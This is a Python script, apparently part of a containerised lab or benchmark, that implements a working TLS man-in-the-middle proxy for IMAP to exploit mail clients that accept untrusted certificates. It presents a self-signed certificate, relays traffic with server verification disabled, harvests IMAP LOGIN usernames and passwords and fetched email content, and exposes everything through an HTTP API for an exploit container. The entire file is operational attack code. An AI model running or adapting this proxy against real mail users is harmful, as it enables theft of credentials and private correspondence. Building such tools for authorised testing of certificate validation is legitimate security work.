#!/usr/bin/env python3
"""
TLS MITM IMAP proxy for CWE-295 exploitation.

Accepts IMAPS connections with a self-signed certificate (untrusted by
the system CA store), forwards to the real IMAP server, and captures
IMAP LOGIN credentials and FETCH responses containing email content.

Also exposes a lightweight HTTP API on port 8082 for the exploit
container to retrieve captured data.
"""

import http.server
import json
import os
import re
import select
import socket
import ssl
import subprocess
import threading
import time

REAL_IMAP_HOST = os.environ.get("REAL_IMAP_HOST", "thunderbird-app")
REAL_IMAP_PORT = int(os.environ.get("REAL_IMAP_PORT", "993"))
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "993"))
HTTP_PORT = int(os.environ.get("HTTP_PORT", "8082"))
CERT_FILE = os.environ.get("CERT_FILE", "/certs/mitm-cert.pem")
KEY_FILE = os.environ.get("KEY_FILE", "/certs/mitm-key.pem")

captured_data = {
    "credentials": [],
    "email_bodies": [],
    "connections": 0,
}
data_lock = threading.Lock()


def generate_self_signed_cert():
    """Generate a self-signed cert if not already present."""
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        return
    os.makedirs(os.path.dirname(CERT_FILE), exist_ok=True)
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-keyout",
            KEY_FILE,
            "-out",
            CERT_FILE,
            "-days",
            "1",
            "-nodes",
            "-subj",
            "/CN=mail.test.com",
        ],
        check=True,
        capture_output=True,
    )
    print("[mitm] Generated self-signed certificate", flush=True)


def relay(src, dst, direction, conn_id):
    """Relay data between two sockets, capturing IMAP traffic."""
    buf = b""
    try:
        while True:
            ready, _, _ = select.select([src], [], [], 30)
            if not ready:
                continue
            data = src.recv(8192)
            if not data:
                break
            if direction == "client_to_server":
                buf += data
                parse_client_data(buf, conn_id)
                buf = b""
            else:
                parse_server_data(data, conn_id)
            dst.sendall(data)
    except (ConnectionResetError, BrokenPipeError, ssl.SSLError, OSError):
        pass


def parse_client_data(data, conn_id):
    """Parse IMAP client data for LOGIN credentials."""
    try:
        text = data.decode("utf-8", errors="replace")
    except Exception:
        return
    for line in text.splitlines():
        match = re.match(
            r"^[A-Za-z0-9]+\s+LOGIN\s+\"?([^\"\s]+)\"?\s+\"?([^\"\s]+)\"?",
            line,
            re.IGNORECASE,
        )
        if match:
            username = match.group(1)
            password = match.group(2)
            entry = {
                "username": username,
                "password": password,
                "timestamp": time.time(),
                "connection": conn_id,
            }
            with data_lock:
                captured_data["credentials"].append(entry)
            print(
                f"[mitm] CAPTURED LOGIN: {username} (conn {conn_id})",
                flush=True,
            )


def parse_server_data(data, conn_id):
    """Parse IMAP server responses for email body content."""
    try:
        text = data.decode("utf-8", errors="replace")
    except Exception:
        return
    if "BODY" in text or "FETCH" in text:
        with data_lock:
            captured_data["email_bodies"].append(
                {
                    "data": text[:4096],
                    "timestamp": time.time(),
                    "connection": conn_id,
                }
            )


def handle_client(client_sock, client_addr, server_ctx, conn_id):
    """Handle one proxied IMAP connection."""
    print(f"[mitm] Connection {conn_id} from {client_addr}", flush=True)
    with data_lock:
        captured_data["connections"] += 1

    backend_sock = None
    try:
        raw_backend = socket.create_connection(
            (REAL_IMAP_HOST, REAL_IMAP_PORT), timeout=10
        )
        backend_sock = server_ctx.wrap_socket(
            raw_backend, server_hostname=REAL_IMAP_HOST
        )

        t1 = threading.Thread(
            target=relay,
            args=(client_sock, backend_sock, "client_to_server", conn_id),
            daemon=True,
        )
        t2 = threading.Thread(
            target=relay,
            args=(backend_sock, client_sock, "server_to_client", conn_id),
            daemon=True,
        )
        t1.start()
        t2.start()
        t1.join()
        t2.join(timeout=5)
    except Exception as e:
        print(f"[mitm] Connection {conn_id} error: {e}", flush=True)
    finally:
        try:
            client_sock.close()
        except Exception:
            pass
        if backend_sock:
            try:
                backend_sock.close()
            except Exception:
                pass
    print(f"[mitm] Connection {conn_id} closed", flush=True)


class CaptureAPIHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler serving captured MITM data."""

    def do_GET(self):
        with data_lock:
            payload = json.dumps(captured_data)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(payload.encode())

    def log_message(self, fmt, *args):
        pass


def start_http_api():
    """Start the HTTP API server for captured data retrieval."""
    server = http.server.HTTPServer(("0.0.0.0", HTTP_PORT), CaptureAPIHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[mitm] HTTP API listening on port {HTTP_PORT}", flush=True)


def main():
    generate_self_signed_cert()
    start_http_api()

    mitm_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    mitm_ctx.load_cert_chain(CERT_FILE, KEY_FILE)

    server_ctx = ssl.create_default_context()
    server_ctx.check_hostname = False
    server_ctx.verify_mode = ssl.CERT_NONE

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("0.0.0.0", LISTEN_PORT))
    listener.listen(5)
    print(
        f"[mitm] IMAPS MITM listening on port {LISTEN_PORT}, "
        f"forwarding to {REAL_IMAP_HOST}:{REAL_IMAP_PORT}",
        flush=True,
    )

    conn_id = 0
    while True:
        try:
            raw_client, addr = listener.accept()
            client_sock = mitm_ctx.wrap_socket(raw_client, server_side=True)
            conn_id += 1
            threading.Thread(
                target=handle_client,
                args=(client_sock, addr, server_ctx, conn_id),
                daemon=True,
            ).start()
        except ssl.SSLError as e:
            print(f"[mitm] TLS handshake rejected: {e}", flush=True)
        except Exception as e:
            print(f"[mitm] Accept error: {e}", flush=True)


if __name__ == "__main__":
    main()
